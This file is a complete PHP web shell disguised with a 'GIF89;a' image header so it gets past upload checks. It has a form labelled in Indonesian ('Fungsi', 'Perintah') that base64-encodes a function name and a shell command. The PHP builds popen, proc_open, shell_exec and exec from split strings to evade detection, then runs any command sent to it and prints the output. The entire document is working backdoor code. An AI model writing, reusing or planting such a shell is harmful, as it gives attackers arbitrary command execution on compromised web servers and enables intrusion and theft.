<!-- GIF89;a -->
<html>
<body style="background:#000; color:#0f0;">
    <script>
        function encode() {
            var x = document.getElementById('x');
            var y = document.getElementById('y');
            x.value = btoa(x.value);
            y.value = btoa(y.value);
            return true;
        }
    </script>
    <form method="POST" onsubmit="return encode()">
        <input type="text" id="x" name="x" placeholder="Fungsi">
        <input type="text" id="y" name="y" placeholder="Perintah">
        <input type="submit" value="Run">
    </form>
    <pre>
    <?php
    if (isset($_POST['x']) && isset($_POST['y'])) {
        $a = base64_decode(trim($_POST['x']));
        $b = base64_decode($_POST['y']);

        $f_pop = 'p'.'o'.'p'.'e'.'n';
        $f_proc = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';
        $f_sh = 's'.'h'.'e'.'ll'.'_'.'e'.'x'.'e'.'c';
        $f_ex = 'e'.'x'.'e'.'c';

        echo "<b>Ćommānd Ṕrőmpt</b>\n\n";

        if (is_callable($a)) {
            if ($a === $f_proc) {
                $ds = array(1 => array("pipe", "w"), 2 => array("pipe", "w"));
                $p = @$a($b, $ds, $pipes);
                if (is_resource($p)) {
                    echo stream_get_contents($pipes[1]);
                    echo stream_get_contents($pipes[2]);
                    proc_close($p);
                }
            }
            elseif ($a === $f_pop) {
                $h = @$a($b . ' 2>&1', 'r');
                if ($h) {
                    while (!feof($h)) echo fread($h, 1024);
                    pclose($h);
                }
            }
            elseif ($a === $f_sh || $a === $f_ex) {
                if ($a === $f_ex) { 
                    @$a($b, $o);
                    echo implode("\n", $o); 
                }
                else { 
                    echo @$a($b); 
                }
            }
            else {
                echo @$a($b);
            }
        } else {
            echo "Error: Forbidden.";
        }
    }
    ?>
    </pre>
</body>
</html>
